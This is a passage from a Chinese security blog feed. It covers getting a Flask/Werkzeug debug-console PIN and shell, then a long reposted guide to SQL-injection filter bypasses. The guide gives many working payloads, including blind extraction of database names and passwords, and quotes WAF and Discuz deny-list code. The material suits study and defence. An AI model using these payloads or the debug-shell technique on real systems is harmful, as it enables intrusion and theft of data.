class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>得到pin码之后在报错页面<br><img src="/blogs/images/flask_debug_mode1.png" alt="报错页面"><br>点击shell图标(当鼠标浮于任何一行文字时会出现)<br>输入pin码</p><p>得到shell<br><img src="/blogs/images/flask_debug_mode2.png" alt="shell"><br>最好用os.popen</p>]]></content>
    
    
    <categories>
      
      <category>flask</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入绕过</title>
    <link href="/blogs/sql/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <url>/blogs/sql/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>转载并修改自 <a href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87-1">链接</a></p><h1 id="SQL注入针对关键字过滤的绕过技巧"><a href="#SQL注入针对关键字过滤的绕过技巧" class="headerlink" title="SQL注入针对关键字过滤的绕过技巧"></a>SQL注入针对关键字过滤的绕过技巧</h1><p>在SQL注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p><span id="more"></span><blockquote><p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加SQL注入过滤和检测的几种思路和绕过方法</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><h3 id="使用注释符-绕过"><a href="#使用注释符-绕过" class="headerlink" title="使用注释符/**/绕过"></a>使用注释符<code>/**/</code>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>name<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">table</span><br></code></pre></td></tr></table></figure><h3 id="使用url编码绕过"><a href="#使用url编码绕过" class="headerlink" title="使用url编码绕过"></a>使用<strong>url编码</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span>a0 发出去就是空格的意思，但是需要在burp中抓包后修改<br></code></pre></td></tr></table></figure><h3 id="使用浮点数绕过"><a href="#使用浮点数绕过" class="headerlink" title="使用浮点数绕过"></a>使用<strong>浮点数</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8E0</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>等价于<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8.0</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="使用Tab替代空格"><a href="#使用Tab替代空格" class="headerlink" title="使用Tab替代空格"></a>使用<strong>Tab</strong>替代空格</h3><h3 id="使用两个空格替代一个空格"><a href="#使用两个空格替代一个空格" class="headerlink" title="使用两个空格替代一个空格"></a>使用<strong>两个空格</strong>替代一个空格</h3><h3 id="使用括号绕过"><a href="#使用括号绕过" class="headerlink" title="使用括号绕过"></a>使用<strong>括号</strong>绕过</h3><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。<br>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>(<span class="hljs-keyword">user</span>())<span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span>(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-keyword">and</span>(<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">and</span>(sleep(ascii(mid(database()<span class="hljs-keyword">from</span>(<span class="hljs-number">1</span>)<span class="hljs-keyword">for</span>(<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">109</span>))<span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><h3 id="使用16进制绕过"><a href="#使用16进制绕过" class="headerlink" title="使用16进制绕过"></a>使用<strong>16进制</strong>绕过</h3><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条SQL语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。<br><code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的SQL语句就变为了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><h3 id="使用from关键字绕过"><a href="#使用from关键字绕过" class="headerlink" title="使用from关键字绕过"></a>使用<strong>from关键字</strong>绕过</h3><p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> mid(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h3 id="使用join关键字绕过"><a href="#使用join关键字绕过" class="headerlink" title="使用join关键字绕过"></a>使用<strong>join关键字</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br>等价于<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b<br></code></pre></td></tr></table></figure><h3 id="使用like关键字绕过"><a href="#使用like关键字绕过" class="headerlink" title="使用like关键字绕过"></a>使用<strong>like关键字</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> ascii(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">80</span>   #等价于<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;r%&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="使用offset关键字绕过"><a href="#使用offset关键字绕过" class="headerlink" title="使用offset关键字绕过"></a>使用<strong>offset关键字</strong>绕过</h3><p>对于limit可以使用offset来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br>等价于<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="过滤注释符（-和-）"><a href="#过滤注释符（-和-）" class="headerlink" title="过滤注释符（ # 和 -- ）"></a>过滤注释符（ <code>#</code> 和 <code>--</code> ）</h2><h3 id="手动闭合引号，不使用注释符"><a href="#手动闭合引号，不使用注释符" class="headerlink" title="手动闭合引号，不使用注释符"></a>手动闭合引号，不使用注释符</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3||&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,&#x27;</span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="过滤比较符号-（-）"><a href="#过滤比较符号-（-）" class="headerlink" title="过滤比较符号 （ &lt; 和 &gt; ）"></a>过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h2><h3 id="使用-greatest-、least（）函数-绕过"><a href="#使用-greatest-、least（）函数-绕过" class="headerlink" title="使用**greatest()、least（）函数**绕过"></a>使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</h3><p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p><p>最常见的一个盲注的SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值</p><p>那么上面的这条SQL语句可以使用greatest变为如下的子句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><h3 id="使用-between-and-绕过"><a href="#使用-between-and-绕过" class="headerlink" title="使用**between and**绕过"></a>使用**<code>between</code> <code>and</code>**绕过</h3><p>between a and b：返回a，b之间的数据，不包含b。</p><h2 id="过滤等号（-）"><a href="#过滤等号（-）" class="headerlink" title="过滤等号（ = ）"></a>过滤等号（ <code>=</code> ）</h2><h3 id="使用like-、rlike-、regexp-或者-使用-或者"><a href="#使用like-、rlike-、regexp-或者-使用-或者" class="headerlink" title="使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;"></a>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</h3><h2 id="过滤or-and-xor-not"><a href="#过滤or-and-xor-not" class="headerlink" title="过滤or and xor not"></a>过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></h2><h3 id="使用符号代替"><a href="#使用符号代替" class="headerlink" title="使用符号代替"></a>使用符号代替</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span><span class="hljs-operator">=</span>`<span class="hljs-operator">&amp;&amp;</span>`  <span class="hljs-keyword">or</span><span class="hljs-operator">=</span>`<span class="hljs-operator">||</span>`   xor<span class="hljs-operator">=</span>`<span class="hljs-operator">|</span>`   <span class="hljs-keyword">not</span><span class="hljs-operator">=</span>`<span class="hljs-operator">!</span>`<br></code></pre></td></tr></table></figure><h2 id="过滤union，select，where等"><a href="#过滤union，select，where等" class="headerlink" title="过滤union，select，where等"></a>过滤<code>union</code>，<code>select</code>，<code>where</code>等</h2><h3 id="使用大小写绕过"><a href="#使用大小写绕过" class="headerlink" title="使用大小写绕过"></a>使用<strong>大小写</strong>绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UnIoN/**/SeLeCT</span><br></code></pre></td></tr></table></figure><h3 id="使用内联注释绕过（–暂时不知道有什么用。。。"><a href="#使用内联注释绕过（–暂时不知道有什么用。。。" class="headerlink" title="使用内联注释绕过（–暂时不知道有什么用。。。:)"></a>使用<strong>内联注释</strong>绕过（–暂时不知道有什么用。。。:)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></code></pre></td></tr></table></figure><h3 id="使用双关键字绕过（若删除掉第一个匹配的union就能绕过）"><a href="#使用双关键字绕过（若删除掉第一个匹配的union就能绕过）" class="headerlink" title="使用双关键字绕过（若删除掉第一个匹配的union就能绕过）"></a>使用<strong>双关键字</strong>绕过（若删除掉第一个匹配的union就能绕过）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></code></pre></td></tr></table></figure><h3 id="使用加号-拆解字符串"><a href="#使用加号-拆解字符串" class="headerlink" title="使用加号+拆解字符串"></a>使用<strong>加号+拆解字符串</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> ‘swords’ <span class="hljs-operator">=</span>‘sw’ <span class="hljs-operator">+</span>’ ords’ ；<span class="hljs-keyword">EXEC</span>(‘<span class="hljs-keyword">IN</span>’ <span class="hljs-operator">+</span>’ SERT <span class="hljs-keyword">INTO</span> ‘<span class="hljs-operator">+</span>’ …..’ )<br></code></pre></td></tr></table></figure><h3 id="使用语法新特性绕过屏蔽select"><a href="#使用语法新特性绕过屏蔽select" class="headerlink" title="使用语法新特性绕过屏蔽select"></a>使用语法新特性绕过屏蔽select</h3><p>在MySQL 8.0.19版本后，MySQL推出了一些新特性，使我们可以不使用select就能够取数据</p><h4 id="TABLE-语句"><a href="#TABLE-语句" class="headerlink" title="TABLE 语句"></a>TABLE 语句</h4><p>可以直接列出表的全部内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">TABLE</span> table_name [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name] [LIMIT number [<span class="hljs-keyword">OFFSET</span> number]]<br></code></pre></td></tr></table></figure><p>如 <code>select * from user</code> 就可以用 <code>table user</code> 替代来进行绕过</p><h4 id="VALUES-语句"><a href="#VALUES-语句" class="headerlink" title="VALUES 语句"></a>VALUES 语句</h4><p>可以列出一行的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">VALUES</span> row_constructor_list [<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_designator] [LIMIT <span class="hljs-keyword">BY</span> number]<br><br>row_constructor_list:<br> <span class="hljs-type">ROW</span>(value_list)[, <span class="hljs-type">ROW</span>(value_list)][, ...]<br><br>value_list:<br> <span class="hljs-keyword">value</span>[, <span class="hljs-keyword">value</span>][, ...]<br><br>column_designator:<br> column_index<br></code></pre></td></tr></table></figure><p>例如直接列出一行的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">VALUES</span> <span class="hljs-type">ROW</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>), <span class="hljs-type">ROW</span>(<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>);<br></code></pre></td></tr></table></figure><blockquote><p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p></blockquote><h2 id="使用编码绕过过滤"><a href="#使用编码绕过过滤" class="headerlink" title="使用编码绕过过滤"></a>使用<strong>编码</strong>绕过过滤</h2><p>如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</p><p><code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code>，而<code>Test</code>也可以为<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></p><h2 id="使用等价函数绕过过滤"><a href="#使用等价函数绕过过滤" class="headerlink" title="使用等价函数绕过过滤"></a>使用<strong>等价函数</strong>绕过过滤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii()<br><br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>benchmark()<br><br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat()<br><br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>()<br><br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>()<br><br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir()<br><br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span>ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>pwd<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>users<span class="hljs-operator">+</span>limit<span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　<br><br>或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><h2 id="补充：进行过滤的几种思路"><a href="#补充：进行过滤的几种思路" class="headerlink" title="补充：进行过滤的几种思路"></a>补充：进行过滤的几种思路</h2><h3 id="黑名单字符替换"><a href="#黑名单字符替换" class="headerlink" title="黑名单字符替换"></a>黑名单字符替换</h3><p>这种是最简单的，针对某些黑名单关键字，直接进行 str_replace</p><p>如果替换的不完全，可以用 <code>selselectect</code> 来替换 <code>select</code> 绕过</p><h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>在一些waf或者cms会见到类似如下的防护代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confi</span><br><span class="hljs-string">rm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)</span><br><span class="hljs-string">\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#x27;\&quot;\\d]+?=[\\(\\)&#x27;\&quot;\\d]+?|[\\(\\)&#x27;\&quot;a-zA-Z]+?=[\\(\\)&#x27;\&quot;a-zA-Z]+?|&gt;|&lt;</span><br><span class="hljs-string">|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#x27;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\(|@&#123;1</span><br><span class="hljs-string">,2&#125;\w+?\s*|\s+?.+?|.*(`|&#x27;|\&quot;).+(`|&#x27;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@&#123;1,2&#125;.+?\s*|\s+?.+?|(`|&#x27;|\&quot;).*?(`|&#x27;|\&quot;)\s*)SET|INSER</span><br><span class="hljs-string">T\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\s+?|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|FROM\s.?|\(select|\(\s</span><br><span class="hljs-string">select|\bunion\b|select\s.+?&quot;</span>;<br></code></pre></td></tr></table></figure><p>这里面匹配了各种模式的注入语句，但是还是可以绕过的</p><p>比如说 <code>INSERT\\s+INTO.+?VALUES</code> 可以使用 <code>insert into xxx select</code> 的方式进行绕过</p><p>在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成</p><p>例如discuz的防护代码 <code>_do_query_safe</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;dfunction&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;load_file&#x27;</span>,<span class="hljs-string">&#x27;hex&#x27;</span>,<span class="hljs-string">&#x27;substring&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>,<span class="hljs-string">&#x27;ord&#x27;</span>,<span class="hljs-string">&#x27;char&#x27;</span>);<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;daction&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;intooutfile&#x27;</span>,<span class="hljs-string">&#x27;intodumpfile&#x27;</span>,<span class="hljs-string">&#x27;unionselect&#x27;</span>,<span class="hljs-string">&#x27;(select&#x27;</span>, <span class="hljs-string">&#x27;un</span><br><span class="hljs-string">ionall&#x27;</span>, <span class="hljs-string">&#x27;uniondistinct&#x27;</span>);<br><span class="hljs-variable">$_config</span>[<span class="hljs-string">&#x27;security&#x27;</span>][<span class="hljs-string">&#x27;querysafe&#x27;</span>][<span class="hljs-string">&#x27;dnote&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;/*&#x27;</span>,<span class="hljs-string">&#x27;*/&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>...<br><span class="hljs-variable">$clean</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-z0-9_\-\(\)#\*\/\&quot;]+/is&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$clean</span>));<br>...<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dfunction&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">self</span>::<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dfunction&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$fun</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$clean</span>, <span class="hljs-variable">$fun</span> . <span class="hljs-string">&#x27;(&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;-1&#x27;</span>;<br>    